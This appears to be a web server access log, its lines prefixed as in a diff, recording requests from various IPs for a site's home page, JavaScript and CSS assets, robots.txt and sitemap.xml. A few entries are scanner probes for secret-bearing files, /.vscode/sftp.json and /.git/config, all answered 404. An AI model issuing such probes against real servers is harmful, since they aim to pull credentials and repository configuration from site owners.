+INFO:     129.211.167.166:23995 - "GET /hBeM HTTP/1.1" 404 Not Found
+INFO:     106.75.175.181:37294 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:44862 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57290 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57302 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:57314 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:34520 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:34532 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50666 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:50678 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     167.94.138.119:55294 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.119:55312 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.119:55326 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.138.119:55334 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.119:55340 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:54064 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59630 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59636 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59644 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59654 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59662 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59670 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59672 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59688 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59694 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59706 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:59718 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:43258 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43274 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43288 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43296 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47586 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47602 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47632 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47630 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47618 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47640 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47646 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47660 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47672 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47680 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47692 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47704 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47698 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57832 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:57836 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:57840 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.5.52:55444 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     159.75.198.97:54254 - "GET / HTTP/1.1" 200 OK
